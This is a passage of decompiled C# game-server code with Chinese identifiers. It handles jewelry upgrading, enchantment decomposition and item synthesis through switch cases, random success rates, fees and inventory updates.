										if (value62.FLD_RESIDE2 != 7 && value62.FLD_RESIDE2 != 8 && value62.FLD_RESIDE2 != 10)
										{
											合成提示(num, 29, 0, 装备栏包裹[hcItimesClass32.位置]);
											合成物品表.Clear();
										}
										else if (value62.FLD_UP_LEVEL == 0)
										{
											合成提示(num, 19, 0, 装备栏包裹[num2]);
											合成物品表.Clear();
										}
										else if (value62.FLD_PID != 100001 && (value62.FLD_PID != 1 || value62.FLD_PID != 700001))
										{
											if (base.Player_Money < 10000000L)
											{
												合成提示(11, 4, 10000000, 装备栏包裹[hcItimesClass32.位置]);
												合成物品表.Clear();
											}
											else
											{
												base.Player_Money -= 10000000L;
												更新金钱和负重();
												double num45 = RNG.Next(0, 101 + value62.FLD_LEVEL);
												double num46 = 0.0;
												if (hcItimesClass68 != null)
												{
													switch (BitConverter.ToInt32(hcItimesClass68.物品id, 0))
													{
													case 800000003:
														num46 += 5.0;
														break;
													case 800000004:
														num46 += 10.0;
														break;
													case 800000005:
														num46 += 15.0;
														break;
													case 1008000136:
														num46 += 25.0;
														break;
													case 800000029:
													case 1008000071:
														num46 += 20.0;
														break;
													}
												}
												if (元宝合成开关 == 1)
												{
													num46 += 5.0;
												}
												if (base.FLD_VIP == 1)
												{
													num46 += 20.0;
												}
												if (base.FLD_人物_追加_合成成功率百分比 != 0.0)
												{
													num46 += 100.0 * base.FLD_人物_追加_合成成功率百分比;
												}
												if (base.FLD_装备_追加_合成成功率百分比 != 0.0)
												{
													num46 += 100.0 * base.FLD_装备_追加_合成成功率百分比;
												}
												byte[] 物品id2 = hcItimesClass32.物品id;
												if (num46 >= num45)
												{
													int num47 = 首饰升级取首饰(value62.FLD_RESIDE2, value62.FLD_PID, 1);
													if (num47 != 0)
													{
														double num48 = RNG.Next(0, 100);
														int value63 = 1;
														if (num48 >= 0.0 && num48 < 10.0)
														{
															value63 = RNG.Next(2, 5);
														}
														byte[] bytes3 = BitConverter.GetBytes(num47);
														if (BitConverter.ToInt32(装备栏包裹[hcItimesClass32.位置].物品ID, 0) != 0 && BitConverter.ToInt64(装备栏包裹[hcItimesClass32.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass32.物品全局ID, 0))
														{
															减去物品(hcItimesClass32.位置, 1);
															ItmeClass value64;
															if (World.Itme.TryGetValue(num47, out value64))
															{
																byte[] array13 = new byte[World.物品属性大小];
																System.Buffer.BlockCopy(hcItimesClass32.物品属性, 0, array13, 0, World.物品属性大小);
																System.Buffer.BlockCopy(BitConverter.GetBytes(value64.FLD_MAGIC1), 0, array13, 4, 4);
																System.Buffer.BlockCopy(BitConverter.GetBytes(value64.FLD_MAGIC2), 0, array13, 8, 4);
																System.Buffer.BlockCopy(BitConverter.GetBytes(value64.FLD_MAGIC3), 0, array13, 12, 4);
																System.Buffer.BlockCopy(BitConverter.GetBytes(value64.FLD_MAGIC4), 0, array13, 16, 4);
																增加物品(hcItimesClass32.物品全局ID, bytes3, hcItimesClass32.位置, BitConverter.GetBytes(value63), array13);
															}
														}
														if (hcItimesClass68 != null)
														{
															减去物品(hcItimesClass68.位置, 1);
														}
														合成提示(num, 21, 合成手续费, 装备栏包裹[hcItimesClass32.位置]);
														goto IL_bede;
													}
													合成提示(num, 29, 合成手续费, 装备栏包裹[hcItimesClass32.位置]);
													合成物品表.Clear();
												}
												else
												{
													int num49 = 首饰升级取首饰(value62.FLD_RESIDE2, value62.FLD_PID, 1);
													if (num49 != 0)
													{
														byte[] bytes4 = BitConverter.GetBytes(num49);
														if (BitConverter.ToInt32(装备栏包裹[hcItimesClass32.位置].物品ID, 0) != 0 && BitConverter.ToInt64(装备栏包裹[hcItimesClass32.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass32.物品全局ID, 0))
														{
															减去物品(hcItimesClass32.位置, 1);
															ItmeClass value65;
															if (World.Itme.TryGetValue(num49, out value65))
															{
																byte[] array14 = new byte[World.物品属性大小];
																System.Buffer.BlockCopy(hcItimesClass32.物品属性, 0, array14, 0, World.物品属性大小);
																System.Buffer.BlockCopy(BitConverter.GetBytes(value65.FLD_MAGIC1), 0, array14, 4, 4);
																System.Buffer.BlockCopy(BitConverter.GetBytes(value65.FLD_MAGIC2), 0, array14, 8, 4);
																System.Buffer.BlockCopy(BitConverter.GetBytes(value65.FLD_MAGIC3), 0, array14, 12, 4);
																System.Buffer.BlockCopy(BitConverter.GetBytes(value65.FLD_MAGIC4), 0, array14, 16, 4);
																增加物品(hcItimesClass32.物品全局ID, bytes4, hcItimesClass32.位置, hcItimesClass32.物品数量, array14);
															}
														}
														if (hcItimesClass68 != null)
														{
															减去物品(hcItimesClass68.位置, 1);
														}
														合成提示(num, 21, 合成手续费, 装备栏包裹[hcItimesClass32.位置]);
														goto IL_bede;
													}
													合成提示(num, 29, 合成手续费, 装备栏包裹[hcItimesClass32.位置]);
													合成物品表.Clear();
												}
											}
										}
										else
										{
											合成提示(num, 29, 0, 装备栏包裹[num2]);
											合成物品表.Clear();
										}
									}
									else
									{
										合成提示(num, 29, 0, 装备栏包裹[hcItimesClass32.位置]);
										合成物品表.Clear();
									}
								}
							}
							goto default;
						case 182:
							try
							{
								if (!合成物品表.ContainsKey(1))
								{
									ItmeClass value60;
									if (装备栏包裹[num2].锁定)
									{
										合成提示(num, 19, 0, 装备栏包裹[num2]);
									}
									else if (装备栏包裹[num2].物品绑定)
									{
										合成提示(num, 19, 0, 装备栏包裹[num2]);
									}
									else if (World.Itme.TryGetValue(BitConverter.ToInt32(装备栏包裹[num2].物品ID, 0), out value60))
									{
										if (value60.FLD_RESIDE2 != 7 && value60.FLD_RESIDE2 != 8 && value60.FLD_RESIDE2 != 10)
										{
											合成提示(num, 19, 0, 装备栏包裹[num2]);
										}
										else if (value60.FLD_UP_LEVEL == 0)
										{
											合成提示(num, 19, 0, 装备栏包裹[num2]);
										}
										else
										{
											int 钱数3 = 合成手续费 = 计算合成强化费用(value60, num2, num);
											HcItimesClass hcItimesClass67 = new HcItimesClass();
											hcItimesClass67.位置 = num2;
											hcItimesClass67.物品 = 装备栏包裹[num2].物品_byte;
											装备栏包裹[num2].锁定 = true;
											合成物品表.Add(1, hcItimesClass67);
											合成提示(num, 1, 钱数3, 装备栏包裹[num2]);
										}
									}
									else
									{
										合成提示(num, 19, 0, 装备栏包裹[num2]);
									}
								}
							}
							catch (Exception ex56)
							{
								Form1.WriteLine(1, "合成系统 首饰升级 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex56.Message);
							}
							goto default;
						case 183:
							try
							{
								if (合成物品表.Count == 0)
								{
									合成提示(num, 5, 0, 装备栏包裹[num2]);
								}
								else if (合成物品表.ContainsKey(1) && !合成物品表.ContainsKey(2))
								{
									合成物品表.Add(2, new HcItimesClass
									{
										位置 = num2,
										物品 = 装备栏包裹[num2].物品_byte
									});
									装备栏包裹[num2].锁定 = true;
									合成提示(num, 1, 0, 装备栏包裹[num2]);
								}
							}
							catch (Exception ex58)
							{
								Form1.WriteLine(1, "合成系统 合成属性 合成3 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex58.Message);
							}
							goto default;
						case 190:
							if (合成物品表.Count > 0)
							{
								HcItimesClass hcItimesClass127 = null;
								if (合成物品表.ContainsKey(1))
								{
									HcItimesClass hcItimesClass128 = 合成物品表[1];
									if (合成物品表.ContainsKey(2))
									{
										HcItimesClass hcItimesClass129 = 合成物品表[2];
										if (合成物品表.ContainsKey(3))
										{
											hcItimesClass127 = 合成物品表[3];
										}
										if (BitConverter.ToInt64(装备栏包裹[hcItimesClass128.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass128.物品全局ID, 0) && BitConverter.ToInt64(装备栏包裹[hcItimesClass129.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass129.物品全局ID, 0) && (hcItimesClass127 == null || BitConverter.ToInt64(装备栏包裹[hcItimesClass127.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass127.物品全局ID, 0)))
										{
											if (装备栏包裹[hcItimesClass128.位置].物品绑定)
											{
												合成提示(num, 2, 0, 装备栏包裹[hcItimesClass128.位置]);
											}
											else
											{
												double num79 = RNG.Next(0, 100);
												double num80 = 40.0;
												if (hcItimesClass127 != null)
												{
													num79 += (double)幸运符加成(BitConverter.ToInt32(hcItimesClass127.物品id, 0));
												}
												if (元宝合成开关 == 1)
												{
													num79 += 5.0;
												}
												if (base.FLD_VIP == 1)
												{
													num79 += 100.0 * World.VIP合成率增加百分比;
												}
												if (World.合成率 != 0.0)
												{
													num79 += 100.0 * World.合成率;
												}
												if (base.FLD_人物_追加_合成成功率百分比 != 0.0)
												{
													num79 += 100.0 * base.FLD_人物_追加_合成成功率百分比;
												}
												if (base.FLD_装备_追加_合成成功率百分比 != 0.0)
												{
													num79 += 100.0 * base.FLD_装备_追加_合成成功率百分比;
												}
												if (num79 >= num80)
												{
													hcItimesClass128.FLD_FJ_中级附魂 = 0;
													减去物品(hcItimesClass128.位置, 1);
													增加物品(hcItimesClass128.物品全局ID, hcItimesClass128.物品id, hcItimesClass128.位置, hcItimesClass128.物品数量, hcItimesClass128.物品属性);
													if (hcItimesClass129 != null)
													{
														减去物品(hcItimesClass129.位置, 1);
													}
													if (hcItimesClass127 != null)
													{
														减去物品(hcItimesClass127.位置, 1);
													}
													装备栏包裹[hcItimesClass128.位置].锁定 = false;
													合成物品表.Clear();
													合成系统解锁();
													元宝合成开关 = 0;
													RxjhClass.合成记录(base.Userid, base.UserName, 装备栏包裹[hcItimesClass128.位置].得到物品名称(), num, "附魂分解", "成功", 装备栏包裹[hcItimesClass128.位置]);
													合成提示(num, 1, 0, 装备栏包裹[num2]);
												}
												else
												{
													if (hcItimesClass129 != null)
													{
														减去物品(hcItimesClass129.位置, 1);
													}
													if (hcItimesClass127 != null)
													{
														减去物品(hcItimesClass127.位置, 1);
													}
													装备栏包裹[hcItimesClass128.位置].锁定 = false;
													合成物品表.Clear();
													合成系统解锁();
													元宝合成开关 = 0;
													RxjhClass.合成记录(base.Userid, base.UserName, 装备栏包裹[hcItimesClass128.位置].得到物品名称(), num, "附魂分解", "失败", 装备栏包裹[hcItimesClass128.位置]);
													合成提示(num, 0, 0, 装备栏包裹[num2]);
												}
											}
										}
									}
								}
							}
							goto default;
						case 191:
							try
							{
								if (!合成物品表.ContainsKey(1) && !装备栏包裹[num2].物品绑定 && 装备栏包裹[num2].FLD_FJ_中级附魂 != 0)
								{
									HcItimesClass hcItimesClass134 = new HcItimesClass();
									hcItimesClass134.位置 = num2;
									hcItimesClass134.物品 = 装备栏包裹[num2].物品_byte;
									装备栏包裹[num2].锁定 = true;
									合成物品表.Add(1, hcItimesClass134);
									合成提示(num, 1, 0, 装备栏包裹[num2]);
								}
							}
							catch (Exception ex103)
							{
								Form1.WriteLine(1, "合成系统 附魂分解 合成1 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex103.Message);
							}
							goto default;
						case 192:
							try
							{
								if (!合成物品表.ContainsKey(2) && BitConverter.ToInt32(装备栏包裹[num2].物品ID, 0) == 1000000780)
								{
									HcItimesClass hcItimesClass126 = new HcItimesClass();
									hcItimesClass126.位置 = num2;
									hcItimesClass126.物品 = 装备栏包裹[num2].物品_byte;
									装备栏包裹[num2].锁定 = true;
									合成物品表.Add(2, hcItimesClass126);
									合成提示(num, 1, 0, 装备栏包裹[num2]);
								}
							}
							catch (Exception ex101)
							{
								Form1.WriteLine(1, "合成系统 附魂分解 合成2 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex101.Message);
							}
							goto default;
						case 193:
							try
							{
								if (合成物品表.Count != 0 && !合成物品表.ContainsKey(3))
								{
									HcItimesClass hcItimesClass135 = new HcItimesClass();
									hcItimesClass135.位置 = num2;
									hcItimesClass135.物品 = 装备栏包裹[num2].物品_byte;
									装备栏包裹[num2].锁定 = true;
									合成物品表.Add(3, hcItimesClass135);
									合成提示(num, 1, 0, 装备栏包裹[num2]);
								}
							}
							catch (Exception ex104)
							{
								Form1.WriteLine(1, "合成系统 附魂分解 合成3 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex104.Message);
							}
							goto default;
						case 199:
							try
							{
								合成物品表.Clear();
								合成系统解锁();
								元宝合成开关 = 0;
								打开仓库中 = false;
								合成提示(num, 1, 0, 装备栏包裹[num2]);
							}
							catch (Exception ex98)
							{
								元宝合成开关 = 0;
								Form1.WriteLine(1, "合成系统 附魂分解 合成4 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex98.Message);
							}
							goto default;
						case 200:
						{
							int num76 = 0;
							try
							{
								HcItimesClass hcItimesClass123;
								HcItimesClass value100;
								HcItimesClass value101;
								HcItimesClass hcItimesClass124;
								ItmeClass value102;
								if (base.当前操作类型 == 148)
								{
									if (合成物品表.ContainsKey(1))
									{
										hcItimesClass123 = 合成物品表[1];
										hcItimesClass123.得到属性();
										hcItimesClass123.强化属性阶段();
										num76 = 1;
										value100 = null;
										value101 = null;
										hcItimesClass124 = null;
										if (合成物品表.ContainsKey(4))
										{
											hcItimesClass124 = 合成物品表[4];
										}
										num76 = 2;
										if (合成物品表.TryGetValue(3, out value101))
										{
											if (BitConverter.ToInt32(value101.物品数量, 0) < 1)
											{
												合成提示(num, 8, 0, 装备栏包裹[num2]);
											}
											else
											{
												num76 = 3;
												if (World.Itme.TryGetValue(BitConverter.ToInt32(hcItimesClass123.物品id, 0), out value102))
												{
													if (value102.FLD_RESIDE2 == 7 || value102.FLD_RESIDE2 == 8 || value102.FLD_RESIDE2 == 10)
													{
														if (value102.FLD_LEVEL >= 100)
														{
															if (合成物品表.TryGetValue(2, out value100))
															{
																if (BitConverter.ToInt32(value100.物品数量, 0) >= 2)
																{
																	goto IL_ca9a;
																}
																合成提示(num, 8, 0, 装备栏包裹[num2]);
															}
															else
															{
																合成提示(num, 5, 0, 装备栏包裹[num2]);
															}
														}
														else
														{
															if (value102.FLD_LEVEL < 80)
															{
																goto IL_ca9a;
															}
															if (合成物品表.TryGetValue(2, out value100))
															{
																if (BitConverter.ToInt32(value100.物品数量, 0) >= 1)
																{
																	goto IL_ca9a;
																}
																合成提示(num, 8, 0, 装备栏包裹[num2]);
															}
															else
															{
																合成提示(num, 5, 0, 装备栏包裹[num2]);
															}
														}
													}
												}
												else
												{
													合成提示(num, 7, 0, 装备栏包裹[num2]);
												}
											}
										}
										else
										{
											合成提示(num, 5, 0, 装备栏包裹[num2]);
										}
									}
									else
									{
										合成提示(num, 5, 0, 装备栏包裹[num2]);
									}
								}
								goto end_IL_c8d9;
								IL_ca9a:
								num76 = 4;
								if (装备栏包裹[hcItimesClass123.位置].物品绑定)
								{
									合成提示(num, 2, 0, 装备栏包裹[hcItimesClass123.位置]);
								}
								else
								{
									num76 = 5;
									double num77 = RNG.Next(20, 110);
									double num78 = hcItimesClass123.强化数量 * 10;
									if (hcItimesClass123.强化数量 >= 10)
									{
										合成物品表.Clear();
										合成提示(num, 0, 0, 装备栏包裹[num2]);
									}
									else
									{
										num76 = 6;
										if (元宝合成开关 == 1)
										{
											num77 += 5.0;
										}
										if (base.FLD_VIP == 1)
										{
											num77 += World.VIP合成率增加百分比;
										}
										if (World.首饰加工率 != 0.0)
										{
											num77 += 100.0 * World.首饰加工率 + 0.1;
										}
										if (base.FLD_人物_追加_合成成功率百分比 != 0.0)
										{
											num77 += 100.0 * base.FLD_人物_追加_合成成功率百分比;
										}
										if (base.FLD_装备_追加_合成成功率百分比 != 0.0)
										{
											num77 += 100.0 * base.FLD_装备_追加_合成成功率百分比;
										}
										if (num77 >= num78)
										{
											if (value102.FLD_RESIDE2 == 7)
											{
												hcItimesClass123.强化类型 = 2;
											}
											else if (value102.FLD_RESIDE2 == 8)
											{
												hcItimesClass123.强化类型 = 3;
											}
											else if (value102.FLD_RESIDE2 == 10)
											{
												hcItimesClass123.强化类型 = 1;
											}
											if (hcItimesClass124 == null)
											{
												int num9 = ++hcItimesClass123.强化数量;
											}
											else if (BitConverter.ToInt32(hcItimesClass124.物品id, 0) == 1008000072)
											{
												hcItimesClass123.强化数量 += RNG.Next(1, 3);
											}
											else if (BitConverter.ToInt32(hcItimesClass124.物品id, 0) == 1000000619)
											{
												int num9 = ++hcItimesClass123.强化数量;
											}
											if (hcItimesClass123.强化数量 > 10)
											{
												hcItimesClass123.强化数量 = 10;
											}
											num76 = 7;
											hcItimesClass123.设置阶段属性();
											num76 = 8;
											if (BitConverter.ToInt32(装备栏包裹[hcItimesClass123.位置].物品ID, 0) != 0 && BitConverter.ToInt64(装备栏包裹[hcItimesClass123.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass123.物品全局ID, 0))
											{
												减去物品(hcItimesClass123.位置, 1);
												增加物品(hcItimesClass123.物品全局ID, hcItimesClass123.物品id, hcItimesClass123.位置, hcItimesClass123.物品数量, hcItimesClass123.物品属性);
											}
											num76 = 9;
											装备栏包裹[hcItimesClass123.位置].锁定 = false;
											RxjhClass.合成记录(base.Userid, base.UserName, value102.ItmeNAME, num, "首饰加工", "成功", 装备栏包裹[num2]);
											合成提示(num, 1, 0, 装备栏包裹[num2]);
										}
										else
										{
											RxjhClass.合成记录(base.Userid, base.UserName, value102.ItmeNAME, num, "首饰加工", "失败", 装备栏包裹[hcItimesClass123.位置]);
											if (hcItimesClass124 != null)
											{
												if (BitConverter.ToInt32(hcItimesClass124.物品id, 0) == 1000000619)
												{
													if (hcItimesClass123.强化数量 <= 2)
													{
														if (value102.FLD_RESIDE2 == 7)
														{
															hcItimesClass123.强化类型 = 2;
														}
														else if (value102.FLD_RESIDE2 == 8)
														{
															hcItimesClass123.强化类型 = 3;
														}
														else if (value102.FLD_RESIDE2 == 10)
														{
															hcItimesClass123.强化类型 = 1;
														}
														int num9 = ++hcItimesClass123.强化数量;
														if (hcItimesClass123.强化数量 > 10)
														{
															hcItimesClass123.强化数量 = 10;
														}
														hcItimesClass123.设置阶段属性();
														num76 = 10;
														if (BitConverter.ToInt32(装备栏包裹[hcItimesClass123.位置].物品ID, 0) != 0 && BitConverter.ToInt64(装备栏包裹[hcItimesClass123.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass123.物品全局ID, 0))
														{
															减去物品(hcItimesClass123.位置, 1);
															增加物品(hcItimesClass123.物品全局ID, hcItimesClass123.物品id, hcItimesClass123.位置, hcItimesClass123.物品数量, hcItimesClass123.物品属性);
														}
														num76 = 11;
														装备栏包裹[hcItimesClass123.位置].锁定 = false;
														合成提示(num, 1, 0, 装备栏包裹[num2]);
													}
													else
													{
														num76 = 12;
														减去物品(hcItimesClass123.位置, 1);
														合成提示(num, 0, 0, 装备栏包裹[num2]);
													}
												}
												else if (BitConverter.ToInt32(hcItimesClass124.物品id, 0) == 1008000072)
												{
													合成提示(num, 0, 0, 装备栏包裹[num2]);
												}
												else
												{
													num76 = 13;
													减去物品(hcItimesClass123.位置, 1);
													合成提示(num, 0, 0, 装备栏包裹[num2]);
												}
											}
											else
											{
												num76 = 14;
												减去物品(hcItimesClass123.位置, 1);
												合成提示(num, 0, 0, 装备栏包裹[num2]);
											}
										}
										num76 = 15;
										if (value100 != null)
										{
											num76 = 16;
											if (value102.FLD_LEVEL >= 100)
											{
												减去物品(value100.位置, 2);
											}
											else if (value102.FLD_LEVEL >= 80)
											{
												减去物品(value100.位置, 1);
											}
											else
											{
												减去物品(value100.位置, 1);
											}
											num76 = 17;
										}
										num76 = 18;
										if (value101 != null)
										{
											num76 = 19;
											减去物品(value101.位置, 1);
										}
										num76 = 20;
										if (hcItimesClass124 != null)
										{
											num76 = 21;
											减去物品(hcItimesClass124.位置, 1);
										}
										num76 = 22;
										合成物品表.Clear();
										合成系统解锁();
										元宝合成开关 = 0;
									}
								}
								end_IL_c8d9:;
							}
							catch (Exception ex97)
							{
								string[] obj5 = new string[8]
								{
									"200首饰加工 出错 ",
									base.Client.WorldId.ToString(),
									"|",
									base.Client.ToString(),
									" ",
									num76.ToString(),
									" ",
									null
								};
								obj5[7] = ((ex97 != null) ? ex97.ToString() : null);
								Form1.WriteLine(1, string.Concat(obj5));
							}
							goto default;
						}
						case 201:
							if (base.当前操作类型 == 148 && !合成物品表.ContainsKey(1))
							{
								ItmeClass value84;
								if (装备栏包裹[num2].物品绑定)
								{
									合成提示(num, 7, 0, 装备栏包裹[num2]);
								}
								else if (装备栏包裹[num2].FLD_强化数量 >= 10)
								{
									合成提示(num, 7, 0, 装备栏包裹[num2]);
								}
								else if (World.Itme.TryGetValue(BitConverter.ToInt32(装备栏包裹[num2].物品ID, 0), out value84) && (value84.FLD_RESIDE2 == 7 || value84.FLD_RESIDE2 == 8 || value84.FLD_RESIDE2 == 10) && value84.FLD_LEVEL >= 60)
								{
									if (value84.FLD_LEVEL >= 100)
									{
										合成提示(num, 121, 0, 装备栏包裹[num2]);
										HcItimesClass hcItimesClass106 = new HcItimesClass();
										hcItimesClass106.位置 = num2;
										hcItimesClass106.物品 = 装备栏包裹[num2].物品_byte;
										装备栏包裹[num2].锁定 = true;
										合成物品表.Add(1, hcItimesClass106);
									}
									else if (value84.FLD_LEVEL >= 80)
									{
										合成提示(num, 111, 0, 装备栏包裹[num2]);
										HcItimesClass hcItimesClass107 = new HcItimesClass();
										hcItimesClass107.位置 = num2;
										hcItimesClass107.物品 = 装备栏包裹[num2].物品_byte;
										装备栏包裹[num2].锁定 = true;
										合成物品表.Add(1, hcItimesClass107);
									}
									else if (value84.FLD_LEVEL >= 60)
									{
										合成提示(num, 101, 0, 装备栏包裹[num2]);
										HcItimesClass hcItimesClass108 = new HcItimesClass();
										hcItimesClass108.位置 = num2;
										hcItimesClass108.物品 = 装备栏包裹[num2].物品_byte;
										装备栏包裹[num2].锁定 = true;
										合成物品表.Add(1, hcItimesClass108);
									}
								}
							}
							goto default;
						case 202:
							if (base.当前操作类型 == 148 && !合成物品表.ContainsKey(2))
							{
								if (合成物品表.ContainsKey(1))
								{
									HcItimesClass hcItimesClass84 = 合成物品表[1];
									ItmeClass value74;
									if (World.Itme.TryGetValue(BitConverter.ToInt32(hcItimesClass84.物品id, 0), out value74))
									{
										if (value74.FLD_LEVEL >= 100)
										{
											if (BitConverter.ToInt32(装备栏包裹[num2].物品ID, 0) != 1000000640)
											{
												合成提示(num, 7, 0, 装备栏包裹[num2]);
											}
											else if (BitConverter.ToInt32(装备栏包裹[num2].物品数量, 0) < 2)
											{
												合成提示(num, 8, 0, 装备栏包裹[num2]);
											}
											else
											{
												合成提示(num, 1, 0, 装备栏包裹[num2]);
												合成提示(num, 1, 0, 装备栏包裹[num2]);
												HcItimesClass hcItimesClass85 = new HcItimesClass();
												hcItimesClass85.位置 = num2;
												hcItimesClass85.物品 = 装备栏包裹[num2].物品_byte;
												装备栏包裹[num2].锁定 = true;
												if (!合成物品表.ContainsKey(2))
												{
													合成物品表.Add(2, hcItimesClass85);
												}
											}
										}
										else if (value74.FLD_LEVEL >= 80)
										{
											if (BitConverter.ToInt32(装备栏包裹[num2].物品ID, 0) != 1000000640)
											{
												合成提示(num, 7, 0, 装备栏包裹[num2]);
											}
											else if (BitConverter.ToInt32(装备栏包裹[num2].物品数量, 0) < 1)
											{
												合成提示(num, 8, 0, 装备栏包裹[num2]);
											}
											else
											{
												合成提示(num, 1, 0, 装备栏包裹[num2]);
												HcItimesClass hcItimesClass86 = new HcItimesClass();
												hcItimesClass86.位置 = num2;
												hcItimesClass86.物品 = 装备栏包裹[num2].物品_byte;
												装备栏包裹[num2].锁定 = true;
												if (!合成物品表.ContainsKey(2))
												{
													合成物品表.Add(2, hcItimesClass86);
												}
											}
										}
									}
									else
									{
										合成提示(num, 7, 0, 装备栏包裹[num2]);
									}
								}
								else
								{
									合成提示(num, 5, 0, 装备栏包裹[num2]);
								}
							}
							goto default;
						case 203:
							if (base.当前操作类型 == 148 && !合成物品表.ContainsKey(3))
							{
								if (合成物品表.ContainsKey(1))
								{
									HcItimesClass hcItimesClass54 = 合成物品表[1];
									ItmeClass value55;
									if (World.Itme.TryGetValue(BitConverter.ToInt32(hcItimesClass54.物品id, 0), out value55))
									{
										if (value55.FLD_RESIDE2 == 7)
										{
											if (BitConverter.ToInt32(装备栏包裹[num2].物品ID, 0) != 1000000638)
											{
												合成提示(num, 7, 0, 装备栏包裹[num2]);
											}
											else
											{
												if (BitConverter.ToInt32(装备栏包裹[num2].物品数量, 0) >= 1)
												{
													goto IL_d766;
												}
												合成提示(num, 8, 0, 装备栏包裹[num2]);
											}
										}
										else if (value55.FLD_RESIDE2 == 8)
										{
											if (BitConverter.ToInt32(装备栏包裹[num2].物品ID, 0) != 1000000637)
											{
												合成提示(num, 7, 0, 装备栏包裹[num2]);
											}
											else
											{
												if (BitConverter.ToInt32(装备栏包裹[num2].物品数量, 0) >= 1)
												{
													goto IL_d766;
												}
												合成提示(num, 8, 0, 装备栏包裹[num2]);
											}
										}
										else
										{
											if (value55.FLD_RESIDE2 != 10)
											{
												goto IL_d766;
											}
											if (BitConverter.ToInt32(装备栏包裹[num2].物品ID, 0) != 1000000639)
											{
												合成提示(num, 7, 0, 装备栏包裹[num2]);
											}
											else
											{
												if (BitConverter.ToInt32(装备栏包裹[num2].物品数量, 0) >= 1)
												{
													goto IL_d766;
												}
												合成提示(num, 8, 0, 装备栏包裹[num2]);
											}
										}
									}
									else
									{
										合成提示(num, 7, 0, 装备栏包裹[num2]);
									}
								}
								else
								{
									合成提示(num, 5, 0, 装备栏包裹[num2]);
								}
							}
							goto default;
						case 204:
							if (base.当前操作类型 == 148 && !合成物品表.ContainsKey(4))
							{
								if (BitConverter.ToInt32(装备栏包裹[num2].物品ID, 0) != 1008000072 && BitConverter.ToInt32(装备栏包裹[num2].物品ID, 0) != 1000000619)
								{
									合成提示(num, 7, 0, 装备栏包裹[num2]);
								}
								else if (合成物品表.ContainsKey(1))
								{
									HcItimesClass hcItimesClass17 = 合成物品表[1];
									hcItimesClass17.得到属性();
									hcItimesClass17.强化属性阶段();
									if (BitConverter.ToInt32(装备栏包裹[num2].物品ID, 0) == 1000000619 && hcItimesClass17.强化数量 > 2)
									{
										合成提示(num, 7, 0, 装备栏包裹[num2]);
									}
									else
									{
										HcItimesClass hcItimesClass18 = new HcItimesClass();
										hcItimesClass18.位置 = num2;
										hcItimesClass18.物品 = 装备栏包裹[num2].物品_byte;
										装备栏包裹[num2].锁定 = true;
										if (!合成物品表.ContainsKey(4))
										{
											合成物品表.Add(4, hcItimesClass18);
										}
										合成提示(num, 1, 0, 装备栏包裹[num2]);
									}
								}
								else
								{
									合成提示(num, 5, 0, 装备栏包裹[num2]);
								}
							}
							goto default;
						case 205:
							try
							{
								HcItimesClass value22;
								if (合成物品表.TryGetValue(1, out value22))
								{
									装备栏包裹[value22.位置].锁定 = false;
									合成物品表.Clear();
									合成系统解锁();
								}
								元宝合成开关 = 0;
								合成提示(num, 1, 0, 装备栏包裹[num2]);
							}
							catch (Exception ex24)
							{
								元宝合成开关 = 0;
								Form1.WriteLine(1, "合成系统 首饰加工 205 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex24.Message);
							}
							goto default;
						case 206:
							try
							{
								if (base.当前操作类型 == 149 && !合成物品表.ContainsKey(1))
								{
									ItmeClass value32;
									if (装备栏包裹[num2].物品绑定)
									{
										合成提示(num, 2, 0, 装备栏包裹[num2]);
									}
									else if (World.Itme.TryGetValue(BitConverter.ToInt32(装备栏包裹[num2].物品ID, 0), out value32))
									{
										if (value32.FLD_RESIDE2 != 7 && value32.FLD_RESIDE2 != 8 && value32.FLD_RESIDE2 != 10)
										{
											合成提示(num, 0, 0, 装备栏包裹[num2]);
										}
										else if (value32.FLD_LEVEL < 60)
										{
											合成提示(num, 0, 0, 装备栏包裹[num2]);
										}
										else
										{
											HcItimesClass hcItimesClass34 = new HcItimesClass();
											hcItimesClass34.位置 = num2;
											hcItimesClass34.物品 = 装备栏包裹[num2].物品_byte;
											装备栏包裹[num2].锁定 = true;
											合成物品表.Add(1, hcItimesClass34);
											合成提示(num, 1, 0, 装备栏包裹[num2]);
										}
									}
									else
									{
										合成提示(num, 0, 0, 装备栏包裹[num2]);
									}
								}
							}
							catch (Exception ex34)
							{
								string[] obj4 = new string[6]
								{
									"206首饰分解 出错",
									base.Client.WorldId.ToString(),
									"|",
									base.Client.ToString(),
									" ",
									null
								};
								obj4[5] = ((ex34 != null) ? ex34.ToString() : null);
								Form1.WriteLine(1, string.Concat(obj4));
							}
							goto default;
						case 207:
							try
							{
								if (base.当前操作类型 == 149 && 合成物品表.Count > 0)
								{
									if (合成物品表.ContainsKey(1))
									{
										HcItimesClass hcItimesClass16 = 合成物品表[1];
										ItmeClass value18;
										if (World.Itme.TryGetValue(BitConverter.ToInt32(hcItimesClass16.物品id, 0), out value18))
										{
											int value19 = 1;
											int value20 = 1000000640;
											int value21 = 0;
											if (得到包裹空位数() < 2)
											{
												合成提示(num, 8, 0, 装备栏包裹[num2]);
											}
											else
											{
												if (value18.FLD_LEVEL >= 100)
												{
													value19 = RNG.Next(11, 15);
												}
												else if (value18.FLD_LEVEL >= 80)
												{
													value19 = RNG.Next(6, 10);
												}
												else if (value18.FLD_LEVEL >= 60)
												{
													value19 = RNG.Next(1, 5);
												}
												int num18 = 得到包裹空位(this);
												if (num18 != -1)
												{
													if (value18.FLD_RESIDE2 == 7)
													{
														value21 = 1000000638;
													}
													else if (value18.FLD_RESIDE2 == 8)
													{
														value21 = 1000000637;
													}
													else if (value18.FLD_RESIDE2 == 10)
													{
														value21 = 1000000639;
													}
													减去物品(hcItimesClass16.位置, 1);
													增加物品2(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(value20), num18, BitConverter.GetBytes(value19), new byte[56]);
													int 位置3 = 得到包裹空位(this);
